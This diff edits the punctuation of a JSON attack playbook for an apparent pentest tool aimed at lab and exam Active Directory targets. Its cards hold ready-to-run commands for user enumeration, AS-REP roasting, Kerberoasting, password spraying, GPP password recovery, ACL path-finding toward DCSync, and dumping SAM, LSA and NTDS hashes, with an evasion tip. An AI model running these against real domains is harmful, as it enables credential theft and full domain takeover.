@@ -27,7 +27,7 @@
    ],
    "priority": 100,
    "proves": "confirms a reachable host, a fast nmap open-port sweep, and the set of open ports",
-   "does_not_prove": "open ports and nothing more — it says nothing about which service runs there, whether it is vulnerable, or any access, credential, or privilege",
+   "does_not_prove": "open ports and nothing more, it says nothing about which service runs there, whether it is vulnerable, or any access, credential, or privilege",
    "report": {
     "finding": "Initial TCP Attack Surface Identified",
     "severity": "informational"
@@ -42,7 +42,7 @@
     {
      "tool": "rustscan",
      "run": "rustscan -a {{target}} --ulimit 5000 -- -sV -oN {{scandir}}/nmap-allports.txt",
-     "note": "OPTIONAL ACCELERANT: rustscan finds the open ports fast, then (after `--`) hands them to nmap for the version scan — the output is ordinary nmap output that obol parses exactly as above, so nmap stays the source of truth. Use it when a full -p- nmap is too slow; nmap is the fallback when rustscan isn't installed."
+     "note": "OPTIONAL ACCELERANT: rustscan finds the open ports fast, then (after `--`) hands them to nmap for the version scan, the output is ordinary nmap output that obol parses exactly as above, so nmap stays the source of truth. Use it when a full -p- nmap is too slow; nmap is the fallback when rustscan isn't installed."
     },
     {
      "tool": "nmap",
@@ -81,7 +81,7 @@
    ],
    "priority": 98,
    "proves": "produces nmap service and version evidence for the ports already found open",
-   "does_not_prove": "service fingerprints alone — not a vulnerability, and no access, credential, or privilege",
+   "does_not_prove": "service fingerprints alone, not a vulnerability, and no access, credential, or privilege",
    "report": {
     "finding": "Service Fingerprinting Completed",
     "severity": "informational"
@@ -108,7 +108,7 @@
   {
    "id": "nmap-vuln-scripts",
    "title": "Nmap NSE Vulnerability Script Scan",
-   "hypothesis": "With services fingerprinted, run nmap's `vuln` NSE category against just the open ports. These are detection scripts — they check for known flaws (ms17-010/EternalBlue, smb/http/rdp CVEs) without exploiting them — so a VULNERABLE verdict is an early, high-value lead to verify, recorded as a vulnerability candidate. Exam-safe: NSE detection is enumeration, not automated exploitation.",
+   "hypothesis": "With services fingerprinted, run nmap's `vuln` NSE category against just the open ports. These are detection scripts, they check for known flaws (ms17-010/EternalBlue, smb/http/rdp CVEs) without exploiting them, so a VULNERABLE verdict is an early, high-value lead to verify, recorded as a vulnerability candidate. Exam-safe: NSE detection is enumeration, not automated exploitation.",
    "tool": "nmap",
    "tools": [
     "nmap"
@@ -167,7 +167,7 @@
    ],
    "priority": 35,
    "proves": "produces evidence from a narrowly scoped UDP scan",
-   "does_not_prove": "UDP exposure by itself — not that the service is exploitable, and no access, credential, or privilege",
+   "does_not_prove": "UDP exposure by itself, not that the service is exploitable, and no access, credential, or privilege",
    "report": {
     "finding": "Focused UDP Surface Checked",
     "severity": "informational"
@@ -213,7 +213,7 @@
    ],
    "priority": 96,
    "proves": "identifies a candidate domain controller, the domain, the LDAP base DN, and that LDAP is reachable",
-   "does_not_prove": "context and enumeration only — no access, credential, or privilege",
+   "does_not_prove": "context and enumeration only, no access, credential, or privilege",
    "report": {
     "finding": "Domain Controller Identified",
     "severity": "informational"
@@ -245,7 +245,7 @@
   {
    "id": "ad-anon-ldap-enum",
    "title": "Anonymous LDAP Enumeration",
-   "hypothesis": "Plenty of lab DCs permit anonymous LDAP binds. Such a bind can reveal the base DN and occasionally the whole user and group directory — description fields included, which administrators are infamous for stuffing with passwords and hints. It is the highest-payoff move you can make against a DC without any credentials.",
+   "hypothesis": "Plenty of lab DCs permit anonymous LDAP binds. Such a bind can reveal the base DN and occasionally the whole user and group directory, description fields included, which administrators are infamous for stuffing with passwords and hints. It is the highest-payoff move you can make against a DC without any credentials.",
    "tool": "ldapsearch",
    "tools": [
     "ldapsearch",
@@ -267,7 +267,7 @@
    ],
    "priority": 94,
    "proves": "confirms the LDAP base DN, a list of domain users, and that anonymous LDAP binding is allowed",
-   "does_not_prove": "context and enumeration only — no access, credential, or privilege",
+   "does_not_prove": "context and enumeration only, no access, credential, or privilege",
    "report": {
     "finding": "Anonymous LDAP Bind Permitted",
     "severity": "medium"
@@ -280,7 +280,7 @@
      "tool": "nxc",
      "run": "nxc ldap {{target}} -u '' -p '' --users",
      "web": "nxc ldap {{target}} -u '' -p '' --users | tee {{scandir}}/ldap-users.txt",
-     "web_note": "tee saves the full dump to scans/ldap-users.txt and still prints it. Paste it back here — obol reads the names and hands you a one-line command to write the tidy loot/users.txt that every AD move ({{userlist}}) reads.",
+     "web_note": "tee saves the full dump to scans/ldap-users.txt and still prints it. Paste it back here, obol reads the names and hands you a one-line command to write the tidy loot/users.txt that every AD move ({{userlist}}) reads.",
      "note": "nxc performs the entire anonymous LDAP dump in a single line, descriptions and all. On anonymously-bindable machines this is the quickest user list you will find anywhere."
     },
     {
@@ -291,7 +291,7 @@
     {
      "tool": "ldapsearch",
      "run": "ldapsearch -x -H ldap://{{target}} -b '{{basedn}}' '(objectClass=user)' sAMAccountName description",
-     "note": "Retrieve both usernames and descriptions. Read each description closely — lab designers tuck secrets into them."
+     "note": "Retrieve both usernames and descriptions. Read each description closely, lab designers tuck secrets into them."
     },
     {
      "tool": "ldapsearch",
@@ -307,20 +307,20 @@
      "tool": "windapsearch",
      "run": "windapsearch.py -d {{domain}} --dc-ip {{target}} --custom 'objectClass=*'",
      "web": "windapsearch.py -d {{domain}} --dc-ip {{target}} --custom 'objectClass=*' | tee {{scandir}}/ad-objects.txt",
-     "web_note": "Dumps every object — often far too many lines to paste. It writes to scans/ad-objects.txt (shown); attach that file in Evidence. For the full graph, SharpHound → the Domain tab is the heavier tool.",
-     "note": "Dump every single object — OUs, groups, computers, service accounts. Service-account names (svc-*) are AS-REP roasting candidates, and Exchange security groups showing up in the results indicate Exchange is deployed (see writedacl-dcsync)."
+     "web_note": "Dumps every object, often far too many lines to paste. It writes to scans/ad-objects.txt (shown); attach that file in Evidence. For the full graph, SharpHound → the Domain tab is the heavier tool.",
+     "note": "Dump every single object, OUs, groups, computers, service accounts. Service-account names (svc-*) are AS-REP roasting candidates, and Exchange security groups showing up in the results indicate Exchange is deployed (see writedacl-dcsync)."
     },
     {
      "tool": "sh",
      "run": "nxc ldap {{target}} -u '' -p '' --users | awk '{print $5}' | grep -vE '^-Username|^\\[|^SM_|^HealthMailbox|\\$$' | sort -u | tee {{lootdir}}/users.txt",
-     "note": "HANDOFF — boil the nxc table down to a tidy userlist (username is in column 5; confirm with head first, since nxc versions move columns around). It strips headers, machine accounts ($), and system mailboxes, then writes straight to loot/users.txt — the exact {{userlist}} obol fills into kerbrute, spraying, and roasting, so there is nothing to point by hand."
+     "note": "HANDOFF, boil the nxc table down to a tidy userlist (username is in column 5; confirm with head first, since nxc versions move columns around). It strips headers, machine accounts ($), and system mailboxes, then writes straight to loot/users.txt, the exact {{userlist}} obol fills into kerbrute, spraying, and roasting, so there is nothing to point by hand."
     }
    ]
   },
   {
    "id": "ad-user-enum",
    "title": "User Enumeration (Kerberos and RPC)",
-   "hypothesis": "Kerberos behaves as a username oracle: the KDC responds one way for real accounts and another for fake ones. On lenient DCs, null SMB sessions can also list users over RPC. A confirmed user list is the feedstock for AS-REP roasting, Kerberoasting, and spraying — the launch point for most AD attacks.",
+   "hypothesis": "Kerberos behaves as a username oracle: the KDC responds one way for real accounts and another for fake ones. On lenient DCs, null SMB sessions can also list users over RPC. A confirmed user list is the feedstock for AS-REP roasting, Kerberoasting, and spraying, the launch point for most AD attacks.",
    "tool": "kerbrute",
    "tools": [
     "kerbrute",
@@ -343,7 +343,7 @@
    ],
    "priority": 92,
    "proves": "confirms a list of domain users",
-   "does_not_prove": "context and enumeration only — no access, credential, or privilege",
+   "does_not_prove": "context and enumeration only, no access, credential, or privilege",
    "report": {
     "finding": "Domain User Enumeration Without Credentials",
     "severity": "low"
@@ -355,7 +355,7 @@
     {
      "tool": "nxc",
      "run": "nxc smb {{target}} -u guest -p '' --rid-brute",
-     "note": "RID cycling over a null or guest session — a complete user list with no credentials and no Kerberos chatter. Start with guest, then fall back to '' ''."
+     "note": "RID cycling over a null or guest session, a complete user list with no credentials and no Kerberos chatter. Start with guest, then fall back to '' ''."
     },
     {
      "tool": "kerbrute",
@@ -375,14 +375,14 @@
     {
      "tool": "sh",
      "run": "kerbrute userenum --dc {{target}} -d {{domain}} {{userlist}} -o {{scandir}}/kerb-valid.txt && grep VALID {{scandir}}/kerb-valid.txt | awk '{print $NF}' | cut -d@ -f1 | sort -u | tee {{lootdir}}/users.txt",
-     "note": "HANDOFF — turn kerbrute output into a clean loot/users.txt, the {{userlist}} every later AD move reads (nothing to point by hand). For the rpcclient route, feed enumdomusers through grep user: | cut -d[ -f2 | cut -d] -f1 | sort -u instead."
+     "note": "HANDOFF, turn kerbrute output into a clean loot/users.txt, the {{userlist}} every later AD move reads (nothing to point by hand). For the rpcclient route, feed enumdomusers through grep user: | cut -d[ -f2 | cut -d] -f1 | sort -u instead."
     }
    ]
   },
   {
    "id": "asrep-roast",
    "title": "AS-REP Roasting",
-   "hypothesis": "Accounts flagged DONT_REQUIRE_PREAUTH bypass Kerberos pre-authentication: anyone may ask for an AS-REP, and part of that response is encrypted using the account's password hash. Ask for it, take it offline, and crack it. It needs no credentials — just a valid username. A single weak password on one misconfigured account becomes a foothold.",
+   "hypothesis": "Accounts flagged DONT_REQUIRE_PREAUTH bypass Kerberos pre-authentication: anyone may ask for an AS-REP, and part of that response is encrypted using the account's password hash. Ask for it, take it offline, and crack it. It needs no credentials, just a valid username. A single weak password on one misconfigured account becomes a foothold.",
    "tool": "impacket-GetNPUsers",
    "tools": [
     "impacket-GetNPUsers",
@@ -409,7 +409,7 @@
    ],
    "priority": 80,
    "proves": "yields an AS-REP hash and candidate credentials",
-   "does_not_prove": "candidate material only — not yet a validated credential, and not access",
+   "does_not_prove": "candidate material only, not yet a validated credential, and not access",
    "report": {
     "finding": "AS-REP Roastable Accounts (DONT_REQUIRE_PREAUTH)",
     "severity": "medium"
@@ -422,7 +422,7 @@
     {
      "tool": "nxc",
      "run": "nxc ldap {{target}} -u {{userlist}} -p '' --asreproast {{hashfile}}",
-     "note": "PREFERRED: no credentials at all — each user in the list gets tried, and the roastable ones drop into {{hashfile}} set up for hashcat -m 18200. This is the fastest way in when anonymous LDAP handed you the list, and this converts it into hashes."
+     "note": "PREFERRED: no credentials at all, each user in the list gets tried, and the roastable ones drop into {{hashfile}} set up for hashcat -m 18200. This is the fastest way in when anonymous LDAP handed you the list, and this converts it into hashes."
     },
     {
      "tool": "Rubeus",
@@ -437,7 +437,7 @@
     {
      "tool": "impacket-GetNPUsers",
      "run": "impacket-GetNPUsers {{domain}}/{{user}} -dc-ip {{target}} -no-pass",
-     "note": "The one-account form — when enumeration has already flagged a single suspect service account (svc-*), you can drop the list. It prints the hash to stdout, so save it into {{hashfile}}."
+     "note": "The one-account form, when enumeration has already flagged a single suspect service account (svc-*), you can drop the list. It prints the hash to stdout, so save it into {{hashfile}}."
     },
     {
      "tool": "hashcat",
@@ -447,12 +447,12 @@
     {
      "tool": "john",
      "run": "john {{hashfile}} --fork=4 -w={{wordlist}}",
-     "note": "John recognizes krb5asrep on its own — no mode number to look up. Use john {{hashfile}} --show to check results."
+     "note": "John recognizes krb5asrep on its own, no mode number to look up. Use john {{hashfile}} --show to check results."
     },
     {
      "tool": "sh",
      "run": "sort -u {{hashfile}} > asrep-clean.txt && wc -l asrep-clean.txt",
-     "note": "HANDOFF — remove duplicates before cracking, since repeats only waste GPU. Then run hashcat -m 18200 asrep-clean.txt {{wordlist}}."
+     "note": "HANDOFF, remove duplicates before cracking, since repeats only waste GPU. Then run hashcat -m 18200 asrep-clean.txt {{wordlist}}."
     }
    ]
   },
@@ -498,7 +498,7 @@
     {
      "tool": "hashcat",
      "run": "hashcat -m 18200 {{hashfile}} --show",
-     "note": "Inspect hashes already cracked in the potfile (user:password) without launching the attack again — this is the dependable line for pulling a plaintext out."
+     "note": "Inspect hashes already cracked in the potfile (user:password) without launching the attack again, this is the dependable line for pulling a plaintext out."
     },
     {
      "tool": "john",
@@ -549,7 +549,7 @@
     {
      "tool": "hashcat",
      "run": "hashcat -m 13100 {{hashfile}} --show",
-     "note": "Look over hashes already cracked (user:password) without re-launching — the dependable line for extracting a plaintext."
+     "note": "Look over hashes already cracked (user:password) without re-launching, the dependable line for extracting a plaintext."
     },
     {
      "tool": "john",
@@ -561,7 +561,7 @@
   {
    "id": "gpp-passwords",
    "title": "GPP Passwords in SYSVOL",
-   "hypothesis": "Old Group Policy Preferences saved local-account passwords inside XML files under SYSVOL — a share readable by any domain user, and sometimes by anonymous sessions. The cpassword field is AES-encrypted with a key Microsoft disclosed publicly in 2012, so it is essentially cleartext. SYSVOL commonly stores scripts and config files carrying other secrets as well.",
+   "hypothesis": "Old Group Policy Preferences saved local-account passwords inside XML files under SYSVOL, a share readable by any domain user, and sometimes by anonymous sessions. The cpassword field is AES-encrypted with a key Microsoft disclosed publicly in 2012, so it is essentially cleartext. SYSVOL commonly stores scripts and config files carrying other secrets as well.",
    "tool": "smbclient",
    "tools": [
     "nxc",
@@ -583,7 +583,7 @@
    ],
    "priority": 74,
    "proves": "surfaces candidate credentials and material for config.review",
-   "does_not_prove": "candidate material only — not yet a validated credential, and not access",
+   "does_not_prove": "candidate material only, not yet a validated credential, and not access",
    "report": {
     "finding": "Credentials Recoverable from SYSVOL Group Policy Preferences",
     "severity": "high"
@@ -593,7 +593,7 @@
     {
      "tool": "smbclient",
      "run": "smbclient '//{{target}}/SYSVOL' -N -c 'recurse; ls'",
-     "note": "Lead with the GPP-specific step: an anonymous recursive listing of SYSVOL. Look under Policies for Groups.xml, ScheduledTasks.xml, and Services.xml carrying a cpassword. (A plain share listing is the Anonymous SMB Enumeration move — this one goes straight for the GPP files.)"
+     "note": "Lead with the GPP-specific step: an anonymous recursive listing of SYSVOL. Look under Policies for Groups.xml, ScheduledTasks.xml, and Services.xml carrying a cpassword. (A plain share listing is the Anonymous SMB Enumeration move, this one goes straight for the GPP files.)"
     },
     {
      "tool": "gpp-decrypt",
@@ -627,8 +627,8 @@
    ],
    "priority": 66,
    "phase": "loot",
-   "proves": "the readable file inventory of each accessible share — a map of what is there to pull",
-   "does_not_prove": "a credential or a foothold — a file name is a lead to pull and inspect, never a proven secret",
+   "proves": "the readable file inventory of each accessible share, a map of what is there to pull",
+   "does_not_prove": "a credential or a foothold, a file name is a lead to pull and inspect, never a proven secret",
    "report": {
     "finding": "Sensitive Files Exposed on a Readable SMB Share",
     "severity": "medium"
@@ -645,7 +645,7 @@
     {
      "tool": "nxc",
      "run": "nxc smb {{target}} -u {{user}} -p {{password}} -M spider_plus",
-     "note": "Authenticated spider once you hold a credential — usually reaches far more shares than the null session."
+     "note": "Authenticated spider once you hold a credential, usually reaches far more shares than the null session."
     },
     {
      "tool": "smbmap",
@@ -657,7 +657,7 @@
   {
    "id": "kerberoast",
    "title": "Kerberoasting",
-   "hypothesis": "Any authenticated domain user can request service tickets (TGS) for SPN-bearing accounts — usually service accounts — and each ticket is encrypted with that account's password hash. Pull them all and crack offline. Service accounts tend to have weak passwords and too many rights, which is why this is the standard opening move once you hold any domain credential.",
+   "hypothesis": "Any authenticated domain user can request service tickets (TGS) for SPN-bearing accounts (usually service accounts) and each ticket is encrypted with that account's password hash. Pull them all and crack offline. Service accounts tend to have weak passwords and too many rights, which is why this is the standard opening move once you hold any domain credential.",
    "tool": "impacket-GetUserSPNs",
    "tools": [
     "impacket-GetUserSPNs",
@@ -684,7 +684,7 @@
    ],
    "priority": 78,
    "proves": "yields a TGS (Kerberoast) hash and candidate credentials",
-   "does_not_prove": "candidate material only — not yet a validated credential, and not access",
+   "does_not_prove": "candidate material only, not yet a validated credential, and not access",
    "report": {
     "finding": "Kerberoastable Service Accounts",
     "severity": "medium"
@@ -703,7 +703,7 @@
     {
      "tool": "Rubeus",
      "run": ".\\Rubeus.exe kerberoast /outfile:{{hashfile}}",
-     "note": "Roasts all SPN accounts off your existing session — no password typed on the command line. Exfiltrate {{hashfile}} and crack it with the hashcat command."
+     "note": "Roasts all SPN accounts off your existing session, no password typed on the command line. Exfiltrate {{hashfile}} and crack it with the hashcat command."
     },
     {
      "tool": "impacket-GetUserSPNs",
@@ -723,14 +723,14 @@
     {
      "tool": "sh",
      "run": "grep -h '\\$krb5tgs\\$' {{hashfile}} | sort -u > tgs-clean.txt && wc -l tgs-clean.txt",
-     "note": "HANDOFF — strip duplicates from the roast file (nxc and impacket append on repeat runs), then run hashcat -m 13100 tgs-clean.txt {{wordlist}}. The sidebar hashfile should reference the source file."
+     "note": "HANDOFF, strip duplicates from the roast file (nxc and impacket append on repeat runs), then run hashcat -m 13100 tgs-clean.txt {{wordlist}}. The sidebar hashfile should reference the source file."
     }
    ]
   },
   {
    "id": "password-spray",
    "title": "Password Spraying (Careful)",
-   "hypothesis": "Spraying pits a single password against many accounts — the mirror image of brute forcing, built to stay beneath lockout limits. Seasonal choices (Summer2026!), variations on the company name, and Password1 snag accounts almost everywhere. Lockout policies are no joke, though: read the policy first, ration your attempts, and take it slow.",
+   "hypothesis": "Spraying pits a single password against many accounts, the mirror image of brute forcing, built to stay beneath lockout limits. Seasonal choices (Summer2026!), variations on the company name, and Password1 snag accounts almost everywhere. Lockout policies are no joke, though: read the policy first, ration your attempts, and take it slow.",
    "tool": "nxc",
    "tools": [
     "nxc",
@@ -756,7 +756,7 @@
    ],
    "priority": 72,
    "proves": "confirms a usable credential",
-   "does_not_prove": "a usable credential — but not access until it successfully authenticates to a service",
+   "does_not_prove": "a usable credential, but not access until it successfully authenticates to a service",
    "report": {
     "finding": "Weak Domain Password (Password Spray)",
     "severity": "high"
@@ -774,7 +774,7 @@
     {
      "tool": "nxc",
      "run": "nxc smb {{target}} -u {{userlist}} -p {{password}}",
-     "note": "A single password across all users — nxc removes duplicate targets and resumes smoothly. Let the observation window elapse between passwords."
+     "note": "A single password across all users, nxc removes duplicate targets and resumes smoothly. Let the observation window elapse between passwords."
     },
     {
      "tool": "sprayhound",
@@ -791,7 +791,7 @@
   {
    "id": "bloodhound-collect",
    "title": "BloodHound Collection & Analysis",
-   "hypothesis": "An AD environment is a graph: users, groups, sessions, ACLs, delegation. Graphing it exposes attack paths that manual browsing never would — yet every edge in it can equally be answered with direct LDAP queries, which is your fallback when running a collector is impossible or unwise.",
+   "hypothesis": "An AD environment is a graph: users, groups, sessions, ACLs, delegation. Graphing it exposes attack paths that manual browsing never would, yet every edge in it can equally be answered with direct LDAP queries, which is your fallback when running a collector is impossible or unwise.",
    "tool": "bloodhound-python",
    "tools": [
     "bloodhound-python",
@@ -816,7 +816,7 @@
    ],
    "priority": 84,
    "proves": "produces the AD graph and its attack paths",
-   "does_not_prove": "context and enumeration only — no access, credential, or privilege",
+   "does_not_prove": "context and enumeration only, no access, credential, or privilege",
    "report": {
     "finding": "Active Directory Attack Paths Identified",
     "severity": "high"
@@ -836,7 +836,7 @@
     {
      "tool": "bloodhound-python",
      "run": "bloodhound-python -d {{domain}} -u {{user}} -p '{{password}}' -ns {{target}} -c All --zip",
-     "note": "A complete remote collection. The resulting zips are your evidence — import them into BloodHound CE."
+     "note": "A complete remote collection. The resulting zips are your evidence, import them into BloodHound CE."
     },
     {
      "tool": "bloodhound",
@@ -851,17 +851,17 @@
     {
      "tool": "bloodhound",
      "run": "bloodhound",
-     "note": "The same GUI routine as the remote version — bring in the zip and review the prebuilt queries."
+     "note": "The same GUI routine as the remote version, bring in the zip and review the prebuilt queries."
     },
     {
      "tool": "net",
      "run": "net user {{user}} /domain",
-     "note": "The direct group memberships of your account. Likewise, net group \"Exchange Windows Permissions\" /domain lists the members of any group that interests you — just change the name."
+     "note": "The direct group memberships of your account. Likewise, net group \"Exchange Windows Permissions\" /domain lists the members of any group that interests you, just change the name."
     },
     {
      "tool": "powerview",
      "run": "Get-NetGroup -UserName {{user}}",
-     "note": "Upload PowerView.ps1 and dot-source it first (. .\\PowerView.ps1). This returns every group the user is in, nested ones included — the same answer the graph would produce."
+     "note": "Upload PowerView.ps1 and dot-source it first (. .\\PowerView.ps1). This returns every group the user is in, nested ones included, the same answer the graph would produce."
     },
     {
      "tool": "powerview",
@@ -871,7 +871,7 @@
     {
      "tool": "powerview",
      "run": "Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (Get-DomainUser {{user}}).objectsid}",
-     "note": "Every ACE granted to your user. WriteDacl, GenericAll, or WriteOwner on the domain object is the road to DCSync — see the writedacl-dcsync card."
+     "note": "Every ACE granted to your user. WriteDacl, GenericAll, or WriteOwner on the domain object is the road to DCSync, see the writedacl-dcsync card."
     },
     {
      "tool": "powerview",
@@ -881,14 +881,14 @@
     {
      "tool": "powerview",
      "run": "Find-LocalAdminAccess",
-     "note": "Hosts where your user already holds local admin — lateral-movement targets without needing a session graph."
+     "note": "Hosts where your user already holds local admin, lateral-movement targets without needing a session graph."
     }
    ]
   },
   {
    "id": "ad-path-manual",
    "title": "Manual AD Path-Finding (skip or replace BloodHound)",
-   "hypothesis": "BloodHound is a convenience, not a requirement: every edge it draws is a directory fact you can query by hand. Run these FIRST — often you find the winning path (a roastable account, a group you can join, an ACL you hold, a DCSync grant, a delegation) before SharpHound even finishes, and you never depend on the collection landing or the GUI parsing. When BloodHound fails or returns nothing useful, this is the fallback. Split into three lanes: remote from Linux (nxc/bloodyAD/ldapsearch — no foothold needed), PowerView from a Windows foothold, and built-in net/whoami with nothing to upload.",
+   "hypothesis": "BloodHound is a convenience, not a requirement: every edge it draws is a directory fact you can query by hand. Run these FIRST, often you find the winning path (a roastable account, a group you can join, an ACL you hold, a DCSync grant, a delegation) before SharpHound even finishes, and you never depend on the collection landing or the GUI parsing. When BloodHound fails or returns nothing useful, this is the fallback. Split into three lanes: remote from Linux (nxc/bloodyAD/ldapsearch, no foothold needed), PowerView from a Windows foothold, and built-in net/whoami with nothing to upload.",
    "tool": "nxc",
    "tools": [
     "nxc",
@@ -915,7 +915,7 @@
    ],
    "priority": 90,
    "proves": "names the abusable edges (roastable/delegation/ACL/DCSync/group) a path to Domain Admins is built from",
-   "does_not_prove": "an executed path — each edge still has to be cashed in (asrep-roast, ad-acl-abuse, bloodyad-acl, dcsync)",
+   "does_not_prove": "an executed path, each edge still has to be cashed in (asrep-roast, ad-acl-abuse, bloodyad-acl, dcsync)",
    "report": {
     "finding": "Domain Escalation Path (manual enumeration)",
     "severity": "high"
@@ -929,33 +929,33 @@
      "tool": "bloodyad",
      "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail",
      "web": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail | tee {{scandir}}/bloodyad-writable.txt",
-     "web_note": "In a large domain --detail can run to tens of thousands of lines — too many to paste. It writes to scans/bloodyad-writable.txt (shown); attach that file in Evidence — obol only needs the writable-object lines.",
-     "note": "LANE 1 (remote, no foothold): the single highest-signal question — what objects can THIS account write to? Every writable group/user/computer is a candidate edge (join a group, reset a password, add a shadow cred, grant DCSync). Start here."
+     "web_note": "In a large domain --detail can run to tens of thousands of lines, too many to paste. It writes to scans/bloodyad-writable.txt (shown); attach that file in Evidence, obol only needs the writable-object lines.",
+     "note": "LANE 1 (remote, no foothold): the single highest-signal question, what objects can THIS account write to? Every writable group/user/computer is a candidate edge (join a group, reset a password, add a shadow cred, grant DCSync). Start here."
     },
     {
      "tool": "nxc",
      "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --admin-count",
-     "note": "Privileged accounts (adminCount=1) — the high-value targets a path must end at. Pair with --kerberoasting/--asreproast: a roastable admin is a one-step path."
+     "note": "Privileged accounts (adminCount=1), the high-value targets a path must end at. Pair with --kerberoasting/--asreproast: a roastable admin is a one-step path."
     },
     {
      "tool": "nxc",
      "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M group-mem -o GROUP='Domain Admins'",
-     "note": "Members of Domain Admins (and repeat for Enterprise Admins, Account Operators, Backup Operators, DnsAdmins, Exchange Windows Permissions). A group YOU can add yourself to that nests into one of these IS the path — a classic route (Account Operators -> Exchange Windows Permissions -> WriteDacl -> DCSync)."
+     "note": "Members of Domain Admins (and repeat for Enterprise Admins, Account Operators, Backup Operators, DnsAdmins, Exchange Windows Permissions). A group YOU can add yourself to that nests into one of these IS the path, a classic route (Account Operators -> Exchange Windows Permissions -> WriteDacl -> DCSync)."
     },
     {
      "tool": "nxc",
      "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --asreproast asrep.txt --kerberoasting tgs.txt",
-     "note": "Roastable accounts in one pass — crackable material is often the shortest path in. Feeds crack-asrep / crack-tgs."
+     "note": "Roastable accounts in one pass, crackable material is often the shortest path in. Feeds crack-asrep / crack-tgs."
     },
     {
      "tool": "nxc",
      "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --trusted-for-delegation --find-delegation",
-     "note": "Accounts trusted for delegation — a delegation edge to a DA-logged host or a service you control is a path (see unconstrained-delegation / getst-impersonation). --find-delegation adds the full constrained/RBCD table in one pass. --trusted-to-auth is NOT a netexec flag; for the full constrained/RBCD (T2A4D) picture run impacket-findDelegation -dc-ip {{target}} '{{domain}}/{{user}}:{{password}}'."
+     "note": "Accounts trusted for delegation, a delegation edge to a DA-logged host or a service you control is a path (see unconstrained-delegation / getst-impersonation). --find-delegation adds the full constrained/RBCD table in one pass. --trusted-to-auth is NOT a netexec flag; for the full constrained/RBCD (T2A4D) picture run impacket-findDelegation -dc-ip {{target}} '{{domain}}/{{user}}:{{password}}'."
     },
     {
      "tool": "nxc",
      "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M daclread -o TARGET='Domain Admins' ACTION=read",
-     "note": "Who holds WriteDacl/GenericAll/WriteOwner over a high-value object — the ACL edges bloodyad-acl/ad-acl-abuse cash in. Point TARGET at the domain object (base DN) to find who can grant themselves DCSync."
+     "note": "Who holds WriteDacl/GenericAll/WriteOwner over a high-value object, the ACL edges bloodyad-acl/ad-acl-abuse cash in. Point TARGET at the domain object (base DN) to find who can grant themselves DCSync."
     },
     {
      "tool": "ldapsearch",
@@ -965,17 +965,17 @@
     {
      "tool": "powerview",
      "run": ". .\\PowerView.ps1; Get-DomainGroup -MemberIdentity {{user}} | select name",
-     "note": "LANE 2 (PowerView on a foothold): every group {{user}} belongs to THROUGH NESTING — the same 'member of N groups' BloodHound shows. A privileged group here is an immediate lead."
+     "note": "LANE 2 (PowerView on a foothold): every group {{user}} belongs to THROUGH NESTING, the same 'member of N groups' BloodHound shows. A privileged group here is an immediate lead."
     },
     {
      "tool": "powerview",
      "run": "Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -eq '{{user}}' } | select ObjectDN,ActiveDirectoryRights,ObjectAceType",
-     "note": "The ACLs YOUR account holds over other objects — GenericAll/WriteDacl/WriteOwner/ForceChangePassword/AddMember/AddKeyCredentialLink. This is the ACL half of the graph, computed on the box."
+     "note": "The ACLs YOUR account holds over other objects, GenericAll/WriteDacl/WriteOwner/ForceChangePassword/AddMember/AddKeyCredentialLink. This is the ACL half of the graph, computed on the box."
     },
     {
      "tool": "powerview",
      "run": "Get-DomainObjectAcl -SearchBase '{{basedn}}' -ResolveGUIDs | ? { $_.ObjectAceType -match 'Replication-Get-Changes' } | select SecurityIdentifier,ObjectAceType",
-     "note": "Who already holds DCSync (DS-Replication-Get-Changes / -All) on the domain — if you can control one of those principals, you can DCSync without granting anything."
+     "note": "Who already holds DCSync (DS-Replication-Get-Changes / -All) on the domain, if you can control one of those principals, you can DCSync without granting anything."
     },
     {
      "tool": "powerview",
@@ -992,7 +992,7 @@
   {
    "id": "dump-secrets",
    "title": "Credential Dumping (Local and Domain)",
-   "hypothesis": "Administrative access to a Windows host hands you its secrets: local SAM hashes, credentials in LSASS memory, cached logons. Administrative access to a DC hands you the domain: NTDS.dit and every account's hash. secretsdump handles both — remotely over SMB with admin credentials, or offline against files you have pulled out.",
+   "hypothesis": "Administrative access to a Windows host hands you its secrets: local SAM hashes, credentials in LSASS memory, cached logons. Administrative access to a DC hands you the domain: NTDS.dit and every account's hash. secretsdump handles both, remotely over SMB with admin credentials, or offline against files you have pulled out.",
    "tool": "impacket-secretsdump",
    "tools": [
     "impacket-secretsdump",
@@ -1013,7 +1013,7 @@
    ],
    "priority": 96,
    "proves": "produces NTLM hashes, candidate credentials, and NTDS secrets",
-   "does_not_prove": "candidate material only — not yet a validated credential, and not access",
+   "does_not_prove": "candidate material only, not yet a validated credential, and not access",
    "report": {
     "finding": "Domain Credential Dump",
     "severity": "critical"
@@ -1025,12 +1025,12 @@
     {
      "tool": "nxc",
      "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --sam --lsa",
-     "note": "Local SAM hashes plus LSA secrets (service passwords, cached credentials) in a single run. Use -H {{hash}} for pass-the-hash. Aim {{target}} at a subnet or a targets file to loot every host in one go — this is where nxc outshines everything else."
+     "note": "Local SAM hashes plus LSA secrets (service passwords, cached credentials) in a single run. Use -H {{hash}} for pass-the-hash. Aim {{target}} at a subnet or a targets file to loot every host in one go, this is where nxc outshines everything else."
     },
     {
      "tool": "nxc",
      "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --ntds",
-     "note": "ON A DC: the whole domain (every hash, krbtgt included) through DRSUAPI — one line, no mimikatz. Switch to --ntds vss for a shadow-copy snapshot when replication traffic is being monitored."
+     "note": "ON A DC: the whole domain (every hash, krbtgt included) through DRSUAPI, one line, no mimikatz. Switch to --ntds vss for a shadow-copy snapshot when replication traffic is being monitored."
     },
     {
      "tool": "mimikatz",
@@ -1062,7 +1062,7 @@
   {
    "id": "dcsync",
    "title": "DCSync",
-   "hypothesis": "An account holding replication rights (GetChanges plus GetChangesAll — Domain Admins, and any account handed them through ACL abuse) can request that a DC replicate password data, with no logon to the DC needed. This is where most AD paths finish: abuse ACLs to award yourself replication rights, then sync.",
